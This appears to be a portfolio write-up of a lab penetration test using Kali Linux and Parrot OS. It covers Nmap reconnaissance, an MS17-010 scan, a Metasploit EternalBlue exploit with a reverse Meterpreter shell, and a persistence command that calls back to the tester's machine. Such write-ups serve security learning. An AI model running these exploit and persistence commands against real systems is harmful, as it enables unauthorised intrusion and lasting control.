# Simulated Penetration Test Using Kali Linux and Parrot OS

**Overview:**
This project demonstrates a comprehensive penetration test I conducted using Kali Linux and Parrot OS. The process involved network reconnaissance, vulnerability detection, and exploitation using industry-standard tools like Nmap, Metasploit, and Wireshark. The purpose of this project was to simulate a real-world penetration test to identify vulnerabilities and improve network security.

---

## **Project Details**

### **1. Environment Setup**
I began by setting up virtual environments for both **Kali Linux** and **Parrot OS** on VirtualBox. I used these platforms to perform the penetration testing, leveraging their built-in tools for network scanning, reconnaissance, and exploitation.

- Kali Linux download: [Kali Linux Download](https://www.kali.org/get-kali/#kali-bare-metal)
- Parrot OS download: [Parrot OS Download](https://www.parrotsec.org/download/)

---

### **2. Network Reconnaissance (Nmap)**

Using **Nmap**, I performed a full network scan to discover active devices, open ports, and services. This helped me map out the target network and identify potential vulnerabilities that could be exploited.

- **Ping Sweep:**
  ```bash
  nmap -sn 192.168.1.0/24
  ```
  This command identified all active hosts within the target subnet.
  
- **Port Scanning:**
  ```bash
  nmap -p 22,80,443 192.168.1.10
  ```
  This was used to check for open ports (SSH, HTTP, and HTTPS) on a specific host.

- **Service Version Scanning:**
  ```bash
  nmap -sV 192.168.1.10
  ```
  This provided detailed information on the versions of services running on open ports.

---

### **3. Vulnerability Detection (Nmap Scripting Engine)**

I leveraged the **Nmap Scripting Engine (NSE)** to detect potential vulnerabilities on the target machines.

- **Vulnerability Scan:**
  ```bash
  nmap --script vuln 192.168.1.10
  ```
  This script ran a scan to identify vulnerabilities such as unpatched software or misconfigurations.

- **Specific Vulnerability (SMB Exploit):**
  ```bash
  nmap --script smb-vuln-ms17-010 192.168.1.10
  ```
  This detected the infamous **EternalBlue (MS17-010)** vulnerability, commonly used in ransomware attacks.

---

### **4. Exploitation (Metasploit Framework)**

Using **Metasploit**, I exploited identified vulnerabilities to gain access to the target system. For example, I used the **EternalBlue exploit** to compromise a machine running a vulnerable SMB service.

- **Launching Metasploit:**
  ```bash
  msfconsole
  ```

- **Exploiting SMB Vulnerability (EternalBlue):**
  ```bash
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOST 192.168.1.10
  set LHOST [My IP Address]
  set payload windows/meterpreter/reverse_tcp
  exploit
  ```

Once the exploit was successful, I gained control of the system through a **Meterpreter** shell.

---

### **5. Post-Exploitation Activities (Meterpreter)**

With control of the system, I performed various post-exploitation tasks to simulate real-world attack scenarios, such as extracting system information, capturing sensitive files, and establishing persistent access.

- **Checking System Info:**
  ```bash
  sysinfo
  ```

- **Navigating File System:**
  ```bash
  ls
  cd Documents
  ```

- **Maintaining Access (Persistence):**
  ```bash
  run persistence -X -i 10 -p 8080 -r [My IP Address]
  ```

This ensured that even after a reboot, the compromised system would automatically reconnect to my machine.

---

### **6. Reporting & Documentation**

After completing the penetration test, I generated a comprehensive report outlining all identified vulnerabilities, their potential impact, and recommended remediations. I used **Dradis Framework** for creating detailed reports and documenting each stage of the process.

---

## **Key Tools & Technologies:**

- **Operating Systems:** Kali Linux, Parrot OS
- **Tools:** Nmap, Metasploit, Wireshark, Msfvenom
- **Languages:** Bash scripting
- **Reporting Tool:** Dradis Framework

---

## **Lessons Learned:**

- **Network Scanning:** Learned how to effectively map networks and identify open ports using Nmap.
- **Exploitation Techniques:** Exploited vulnerabilities using Metasploit and custom payloads.
- **Post-Exploitation:** Gained hands-on experience in maintaining access and performing reconnaissance inside a compromised system.
- **Reporting:** Developed skills in documenting findings and providing remediation suggestions to strengthen network security.
